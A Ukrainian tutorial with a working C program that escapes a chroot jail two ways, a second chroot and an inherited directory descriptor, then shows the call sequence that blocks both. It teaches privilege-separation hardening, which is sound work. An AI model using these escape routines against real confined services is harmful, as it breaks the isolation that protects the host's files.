# ⚙️ Втеча з chroot і стіна, що її спиняє — робочий дослід на C

Це той випадок, коли читати про дірку менш переконливо, ніж пролізти в неї руками: нижче — одна невелика програма мовою C, яка замикає себе в дереві каталогів і виходить із нього двома різними дорогами, а потім, після правильної послідовності викликів, не виходить жодною. Кожен рядок, що зачиняє двері, видно окремо — і видно, який саме код помилки лишається на місці зачинених дверей.

## Що будуємо

Одна програма, три сцени. Перша замикається як годиться, а тоді виходить **другим `chroot`** — на нього треба можливість `CAP_SYS_CHROOT` ([можливості замість всесильного root](root:sys-unix/capabilities)). Друга виходить через **успадкований дескриптор каталогу**, відкритий ще до зміни кореня, — і не потребує жодного привілею. Третя проходить канонічний порядок `chroot → chdir("/") → скидання груп/gid/uid → закриття зайвих дескрипторів` — і після нього обидві дороги впираються у стіну: `EPERM` на одній, `EBADF` на другій.

Ключова технічна деталь усього досліду: `chroot` і `setuid` для процесу **безповоротні** — назад кореня не піднімеш, права не повернеш. Тому кожну сцену запускаємо в окремій дитині через [fork](root:sys-unix/fork-semantics): що дитина зробить зі своїм коренем і своєю особою, лишиться в ній і не зачепить ні батька, ні дві інші сцени. Батько тільки готує дерево й чекає.

## Дерево і код

Дерево-в'язниця робиться трьома викликами в `main`: сам корінь `jail`, підкаталог `jail/hole` (у нього замкнеться другий `chroot`) і порожній файл `only-in-jail` — прикмета, щоб перелік каталогу ні з чим не сплутати. Права `0755` на `hole` не випадкові — про це в застереженнях наприкінці.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <pwd.h>
#include <grp.h>
#include <sys/stat.h>
#include <sys/wait.h>

/* Показати кілька імен у каталозі за шляхом: доказ, ВІД ЧОГО почався розбір. */
static void list_dir(const char *label, const char *path)
{
    DIR *d = opendir(path);
    if (!d) { printf("    %s (%s): opendir -> %s\n", label, path, strerror(errno)); return; }
    printf("    %s (%s):", label, path);
    struct dirent *e; int n = 0;
    while ((e = readdir(d)) && n < 6) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        printf(" %s", e->d_name); n++;
    }
    printf("%s\n", n ? "" : " (порожньо)");
    closedir(d);
}

/* Стати непривілейованим nobody. 0 — вдалося; -1 (з errno) — ні (напр. у
   user-namespace, де цей uid не відображено). Порядок залізний: групи, потім
   gid, і ЛИШЕ в кінці uid — після setuid прав на це вже не буде. */
static int become_nobody(void)
{
    struct passwd *pw = getpwnam("nobody");
    uid_t uid = pw ? pw->pw_uid : 65534;
    gid_t gid = pw ? pw->pw_gid : 65534;
    if (setgroups(0, NULL) != 0) return -1;
    if (setgid(gid)        != 0) return -1;
    if (setuid(uid)        != 0) return -1;
    return 0;
}

/* (1) Подвійний chroot: замикаємось як належить, а тоді виходимо ще одним
   chroot. Другий chroot розводить корінь і поточний каталог — і потребує
   можливості CAP_SYS_CHROOT. */
static void scene_double_chroot(void)
{
    puts("[1] Подвійний chroot (потрібна CAP_SYS_CHROOT)");
    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }
    list_dir("усередині", "/");                 /* бачимо лише вміст jail */

    if (chroot("hole") != 0) {                   /* корінь опускається ще нижче */
        printf("    chroot(hole) -> %s (нема CAP_SYS_CHROOT: виходу немає)\n",
               strerror(errno));
        _exit(0);
    }
    /* тепер поточний каталог (колишній корінь jail) — ПОЗА новим коренем */
    for (int i = 0; i < 64; i++) (void)chdir("..");   /* підіймаємось до справжнього / */
    if (chroot(".") != 0) { perror("    chroot(.)"); _exit(1); }
    list_dir("після втечі", "/");               /* справжній корінь системи */
    _exit(0);
}

/* (2) Успадкований дескриптор: «/» відкрито ДО chroot; fchdir переносить
   поточний каталог назад — повз розбір шляху, отже без жодної перевірки на
   корінь і без жодного привілею. */
static void scene_inherited_fd(void)
{
    puts("[2] Успадкований дескриптор каталогу (без жодного привілею)");
    int rootfd = open("/", O_RDONLY | O_DIRECTORY);   /* ДО chroot */
    if (rootfd < 0) { perror("    open(/)"); _exit(1); }

    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }

    if (become_nobody() == 0) puts("    скинули права до nobody");
    else printf("    (права лишились: %s — байдуже, привілей і не потрібен)\n",
                strerror(errno));

    if (fchdir(rootfd) != 0) { perror("    fchdir"); _exit(1); }   /* без перевірки на корінь */

    list_dir("абсолютний \"/\"", "/");   /* усе ще jail: розбір від кореня процесу */
    list_dir("поточний  \".\"", ".");    /* справжній корінь: розбір від cwd */
    _exit(0);
}

/* (3) Замкнено як належить — обидві дороги мертві. */
static void scene_locked_down(void)
{
    puts("[3] Правильна послідовність — обидві втечі заблоковано");
    int rootfd = open("/", O_RDONLY | O_DIRECTORY);
    if (rootfd < 0) { perror("    open(/)"); _exit(1); }

    if (chroot("jail") != 0) { perror("    chroot(jail)"); _exit(1); }
    if (chdir("/")     != 0) { perror("    chdir(/)");     _exit(1); }

    if (become_nobody() != 0) {
        printf("    setuid(nobody) -> %s\n", strerror(errno));
        puts("    (для цієї сцени потрібен справжній root; див. «як запускати»)");
        _exit(0);
    }
    close(rootfd);   /* у бойовому коді: close_range(3, ~0U, 0) — усі відразу */

    int r1 = chroot("hole");                 /* дорога 1: другий chroot */
    printf("    chroot(hole)   -> %s\n", r1 == 0 ? "успіх (!)" : strerror(errno));
    int r2 = fchdir(rootfd);                 /* дорога 2: успадкований дескриптор */
    printf("    fchdir(rootfd) -> %s\n", r2 == 0 ? "успіх (!)" : strerror(errno));

    list_dir("бачимо", "/");                 /* так само лише jail */
    _exit(0);
}

static void run(void (*scene)(void))
{
    pid_t pid = fork();
    if (pid == 0) scene();          /* дитина: усе, що вона зробить, лишиться в ній */
    if (pid  > 0) waitpid(pid, NULL, 0);
    putchar('\n');
}

int main(void)
{
    mkdir("jail", 0755);
    mkdir("jail/hole", 0755);
    int fd = open("jail/only-in-jail", O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) close(fd);

    run(scene_double_chroot);
    run(scene_inherited_fd);
    run(scene_locked_down);
    return 0;
}
```

## Як зібрати й запустити

```
cc -Wall -O2 -o escape escape.c
```

`chroot` потребує `CAP_SYS_CHROOT`, тож просто так дослід не піде — потрібен або справжній root, або власний [простір імен користувачів](root:sys-unix/namespaces), де ви — root:

```
sudo ./escape                 # усі три сцени в повному вигляді
unshare -Ur ./escape          # без справжнього root — але з одним застереженням
```

Різниця між цими двома запусками повчальна сама собою. Під `sudo` ви — справжній суперкористувач: `setuid(nobody)` спрацьовує, тож третя сцена скидає права по-справжньому й показує `EPERM`/`EBADF`. Під `unshare -Ur` ви — root **лише всередині нового простору імен**, і в ньому за замовчуванням відображено один-єдиний uid (ваш → 0). Тому скидання прав там не проходить із самого початку: `unshare -Ur` за замовчуванням ще й забороняє `setgroups` у новому просторі, тож послідовність упирається вже на `setgroups(0, NULL)` з `EPERM` — а якби дійшла до `setuid(65534)`, той упав би з `EINVAL`, бо такого uid у цьому просторі немає. Третя сцена чесно про це повідомляє. Перші дві сцени під `unshare -Ur` працюють повністю: другий `chroot` проходить (у своєму просторі імен ви маєте `CAP_SYS_CHROOT`), а `fchdir` привілею й не просив. Нижче — вивід повного, `sudo`-запуску.

## Що воно друкує

```
[1] Подвійний chroot (потрібна CAP_SYS_CHROOT)
    усередині (/): hole only-in-jail
    після втечі (/): bin dev etc home lib root

[2] Успадкований дескриптор каталогу (без жодного привілею)
    скинули права до nobody
    абсолютний "/" (/): hole only-in-jail
    поточний  "." (.): bin dev etc home lib root

[3] Правильна послідовність — обидві втечі заблоковано
    chroot(hole)   -> Operation not permitted
    fchdir(rootfd) -> Bad file descriptor
    бачимо (/): hole only-in-jail
```

Перелік і порядок імен справжнього кореня залежать від системи — `readdir` не обіцяє жодного порядку, — але суть у контрасті. `hole only-in-jail` — це вміст в'язниці; `bin dev etc home lib …` — вміст справжнього кореня. Де програма бачить одне, а де інше — і є доказ, звідки насправді почався розбір.

Найгостріше видно в другій сцені. Той самий процес, у той самий момент, тим самим викликом `opendir` дивиться на два тексти — `"/"` і `"."` — і дістає **два різні дерева**. Абсолютний шлях відлічується від кореня процесу й лишається у в'язниці; поточний каталог `.` після `fchdir` показує на справжній корінь, і розбір від нього виводить куди завгодно. Дескриптор `rootfd` проніс досередини ключ, якого зміна кореня не відібрала.

## Який рядок зачиняє яку дорогу

Третя сцена — це не «інша програма», а **та сама** послідовність, у якій кожен виклик знімає рівно одну з попередніх втеч.

- `chdir("/")` одразу після `chroot` ставить поточний каталог **всередину** нового кореня. Без цього рядка поточний каталог лишився б там, де був, — поза деревом, — і жодного `..` для першої втечі навіть не треба було б: відносні шляхи вже вели б назовні.
- `setuid(nobody)` (а перед ним `setgroups`/`setgid`) забирає `CAP_SYS_CHROOT` разом з усіма правами root. Саме тому `chroot("hole")` у зведенні дає `Operation not permitted` — ядро дійшло до перевірки можливості й повернуло `EPERM`. Порядок тут залізний: `chroot` мусить іти **до** втрати привілею, а `setgid` — **до** `setuid`, бо після скидання uid змінити групу вже нічим ([setuid і підвищення прав](root:sys-unix/setuid-and-privilege)).
- `close(rootfd)` перекреслює [дескриптор](root:sys-unix/file-descriptor), який пронесли досередини. Тому `fchdir(rootfd)` дає `Bad file descriptor` — `EBADF`: числа `rootfd` більше немає на що навести. У бойовому коді закривають не один дескриптор, а всі успадковані одразу — `close_range(3, ~0U, 0)` (системний виклик Linux 5.9, 2020; обгортка в glibc з 2.34) або старіший `closefrom(3)`.

Прибрати будь-який із цих рядків — і відповідна втеча оживає. Це і є весь механізм оборони: не одна стіна, а три різні двері, кожні зачинені своїм замком.

## Застереження, на яких легко спіткнутися

**Права `0755` на `hole` — не окраса.** Ядро в `chroot` спершу перевіряє доступ на пошук у цільовому каталозі (`MAY_EXEC`) і **лише потім** — можливість `CAP_SYS_CHROOT`. Якби `hole` належав root із правами `0700`, непривілейований `nobody` спіткнувся б на першій перевірці й дістав `EACCES` («Permission denied»), а не `EPERM` — і сцена показувала б блокування не з тієї причини, яку ми хочемо продемонструвати. Права `0755` дають пройти першу перевірку, щоб стіною став саме брак можливості.

**Дослід потребує привілейованого старту.** Обидві втечі спираються на те, що процес спершу зміг зробити `chroot` — а це вже привілейована дія. Сенс не в тому, що будь-хто вискочить із будь-якого дерева, а в тому, що **всередині** привілейованого процесу, який замкнув себе абияк, лишаються відчинені дороги; і що скидання прав та закриття дескрипторів ці дороги зачиняють. Це рівно та конструкція, на якій стоять служби з розділенням привілеїв.

**`fork` тут — не оптимізація, а необхідність.** Спробуй зробити три сцени в одному процесі поспіль — і третя стартувала б уже із зіпсованим коренем від першої та скинутими правами від будь-якої, що їх скидала. Окрема дитина на сцену ([fork](root:sys-unix/fork-semantics)) дає кожній чисте поле; батько лишається звичайним процесом і лише прибирає.

**І головне, чого дослід не спростовує.** Він показує механіку дір і механіку замків, але не перетворює `chroot` на межу довіри. Навіть у третій, замкненій сцені процес досі бачить усі PID-и, тримає відкриті раніше сокети й ділить з усіма машину. `chroot` плюс скидання прав — це добра оборона проти читання й псування чужих **файлів** і майже ніяка проти всього іншого; надійне замикання будують уже на просторах імен ([принцип найменших привілеїв](root:sf-security/least-privilege)).
